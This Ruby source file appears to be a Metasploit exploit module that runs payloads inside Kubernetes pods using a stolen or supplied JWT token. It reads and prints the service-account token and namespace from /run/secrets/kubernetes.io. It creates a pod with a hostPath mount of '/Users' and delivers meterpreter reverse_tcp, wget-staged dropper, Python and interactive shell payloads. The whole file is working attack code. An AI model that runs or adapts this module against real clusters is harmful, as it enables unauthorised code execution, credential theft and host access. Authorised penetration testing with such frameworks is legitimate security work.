# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::PostMixin
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kubernetes authenticated code execution',
        'Description' => %q{
          Execute a payload within a Kubernetes pod.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'alanfoster',
          'Spencer McIntyre'
        ],
        'References' => [
        ],
        'Notes' => {
          'SideEffects' => [
            ARTIFACTS_ON_DISK, # the Linux Dropper target uses the command stager which writes to disk
            CONFIG_CHANGES, # the Kubernetes configuration is changed if a new pod is created
            IOC_IN_LOGS # a log event is generated if a new pod is created
          ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ]
        },
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => true
        },
        'Targets' => [
          [
            'Interactive WebSocket',
            {
              'Arch' => ARCH_CMD,
              'Platform' => 'unix',
              'Type' => :nix_stream,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/interact'
              },
              'Payload' => {
                'Compat' => {
                  'PayloadType' => 'cmd_interact',
                  'ConnectionType' => 'find'
                }
              }
            }
          ],
          [
            'Unix Command',
            {
              'Arch' => ARCH_CMD,
              'Platform' => 'unix',
              'Type' => :nix_cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Platform' => 'linux',
              'Type' => :nix_dropper,
              'DefaultOptions' => {
                'CMDSTAGER::FLAVOR' => 'wget',
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Python',
            {
              'Arch' => [ARCH_PYTHON],
              'Platform' => 'python',
              'Type' => :python,
              'PAYLOAD' => 'python/meterpreter/reverse_tcp'
            }
          ]
        ],
        'DisclosureDate' => '2021-10-01',
        'DefaultTarget' => 0,
        'Platform' => [ 'linux', 'unix' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )

    register_options(
      [
        Opt::RHOSTS(nil, false),
        Opt::RPORT(nil, false),
        Msf::OptInt.new('SESSION', [ false, 'An optional session to use for configuration' ]),
        OptString.new('TOKEN', [ false, 'The JWT token' ]),
        OptString.new('POD', [ true, 'The pod name to execute in' ]),
        OptString.new('NAMESPACE', [ false, 'The Kubernetes namespace', 'default' ]),
        OptString.new('SHELL', [true, 'The shell to use for execution', 'sh' ]),
      ]
    )
  end

  def api_token
    @api_token || datastore['TOKEN']
  end

  def rhost
    @rhost || datastore['RHOST']
  end

  def rport
    @rport || datastore['RPORT']
  end

  def namespace
    @namespace || datastore['NAMESPACE']
  end

  def pod_name
    @pod_name || datastore['POD']
  end

  def configure_via_session
    vprint_status("Configuring options via session #{session.sid}")

    unless directory?('/run/secrets/kubernetes.io')
      # This would imply that the target is not a Kubernetes container
      fail_with(Failure::NotFound, 'The kubernetes.io directory was not found')
    end

    if api_token.blank?
      token = read_file('/run/secrets/kubernetes.io/serviceaccount/token')
      fail_with(Failure::NotFound, 'The API token was not found, manually set the TOKEN option') if token.blank?

      print_good("API Token: #{token}")
      @api_token = token
    end

    if namespace.blank?
      ns = read_file('/run/secrets/kubernetes.io/serviceaccount/namespace')
      fail_with(Failure::NotFound, 'The namespace was not found, manually set the NAMESPACE option') if ns.blank?

      print_good("Namespace: #{ns}")
      @namespace = ns
    end

    service_host = service_port = nil
    if rhost.blank?
      service_host = get_env('KUBERNETES_SERVICE_HOST')
      fail_with(Failure::NotFound, 'The KUBERNETES_SERVICE_HOST environment variable was not found, manually set the RHOSTS option') if service_host.blank?

      @rhost = service_host
    end

    if rport.blank?
      service_port = get_env('KUBERNETES_SERVICE_PORT')
      fail_with(Failure::NotFound, 'The KUBERNETES_SERVICE_PORT environment variable was not found, manually set the RPORT option') if service_port.blank?

      @rport = service_port.to_i
    end

    if service_host || service_port
      service = "#{Rex::Socket.is_ipv6?(service_host) ? '[' + service_host + ']' : service_host}:#{service_port}"
      print_good("Kubernetes service host: #{service}")
    end
  end

  def connect_ws(opts = {}, *args)
    opts['comm'] = session
    opts['vhost'] = rhost
    super
  end

  def send_request_raw(opts = {}, *args)
    opts['comm'] = session
    opts['vhost'] = rhost
    super
  end

  def create_pod
    random_identifiers = Rex::RandomIdentifier::Generator.new({
      first_char_set: Rex::Text::LowerAlpha,
      char_set: Rex::Text::LowerAlpha + Rex::Text::Numerals
    })

    image_name = @kubernetes_client.list_pods(namespace).dig(:items, 0, :spec, :containers, 0, :image)
    print_status("Using image: #{image_name}")

    new_pod_definition = {
      apiVersion: 'v1',
      kind: 'Pod',
      metadata: {
        name: random_identifiers[:pod_name],
        labels: {}
      },
      spec: {
        containers: [
          {
            name: random_identifiers[:container_name],
            image: image_name,
            command: ['/bin/sh', '-c', 'exec tail -f /dev/null'],
            volumeMounts: [
              {
                mountPath: '/host_mnt',
                name: random_identifiers[:volume_name]
              }
            ]
          }
        ],
        volumes: [
          {
            name: random_identifiers[:volume_name],
            hostPath: {
              path: '/Users'
            }
          }
        ]
      }
    }
    result = @kubernetes_client.create_pod(new_pod_definition, namespace)
    report_note(
      type: 'kubernetes.pod',
      host: rhost,
      port: rport,
      data: {
        pod: result[:metadata].slice(:name, :namespace, :uid, :creationTimestamp)
      },
      update: :unique_data
    )

    @pod_name = random_identifiers[:pod_name]
    print_good("Pod created: #{pod_name}")

    phase = nil
    print_status('Waiting for the pod to be ready...')
    10.times do
      sleep 3
      phase = @kubernetes_client.get_pod(pod_name, namespace)&.dig(:status, :phase)&.downcase
      break unless phase == 'pending'
    end

    fail_with(Failure::TimeoutExpired, 'The pod failed to start within the expected timeframe') unless phase == 'running'
  end

  def exploit
    if session
      print_status("Routing traffic through session: #{session.sid}")
      configure_via_session
    end

    validate_configuration!

    @kubernetes_client = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new({ http_client: self, token: api_token })

    create_pod if pod_name.blank?

    case target['Type']
    when :nix_stream
      # Setting tty => true allows the shell prompt to be seen but it also causes commands to be echoed back
      websocket = @kubernetes_client.exec_pod(
        pod_name,
        datastore['Namespace'],
        datastore['Shell'],
        'stdin' => true,
        'stdout' => true,
        'stderr' => true,
        'tty' => false
      )
      fail_with(Failure::Unknown, 'Failed to establish the WebSocket') if websocket.nil?

      print_good('Successfully established the WebSocket')
      channel = Msf::Exploit::Remote::HTTP::Kubernetes::Client::ExecChannel.new(websocket)
      handler(channel.lsock)
    when :nix_cmd
      execute_command(payload.encoded)
    when :nix_dropper
      execute_cmdstager
    else
      execute_command(payload.encoded)
    end
  rescue Rex::Proto::Http::WebSocket::ConnectionError => e
    res = e.http_response
    fail_with(Failure::Unreachable, e.message) if res.nil?
    fail_with(Failure::NoAccess, 'Insufficient Kubernetes access') if res.code == 401 || res.code == 403
    fail_with(Failure::Unknown, e.message)
  else
    report_service(host: rhost, port: rport, proto: 'tcp', name: 'kubernetes')
  end

  def execute_command(cmd, _opts = {})
    case target['Platform']
    when 'python'
      command = [datastore['Shell'], '-c', "exec $(which python || which python3 || which python2) -c #{Shellwords.escape(cmd)}"]
    else
      command = [datastore['Shell'], '-c', cmd]
    end

    result = @kubernetes_client.exec_pod_capture(
      pod_name,
      datastore['Namespace'],
      command,
      'stdin' => false,
      'stdout' => true,
      'stderr' => true,
      'tty' => false
    ) do |stdout, stderr|
      print_line(stdout.strip) unless stdout.blank?
      print_line(stderr.strip) unless stderr.blank?
    end

    fail_with(Failure::Unknown, 'Failed to execute the command') if result.nil?

    status = result&.dig(:error, 'status')
    fail_with(Failure::Unknown, "Status: #{status || 'Unknown'}") unless status == 'Success'
  end

  def validate_configuration!
    fail_with(Failure::BadConfig, 'Missing option: RHOSTS') if rhost.blank?
    fail_with(Failure::BadConfig, 'Missing option: RPORT') if rport.blank?
    fail_with(Failure::BadConfig, 'Invalid option: RPORT') unless rport.to_i > 0 && rport.to_i < 65536
    fail_with(Failure::BadConfig, 'Missing option: TOKEN') if api_token.blank?
    fail_with(Failure::BadConfig, 'Missing option: NAMESPACE') if namespace.blank?
  end
end
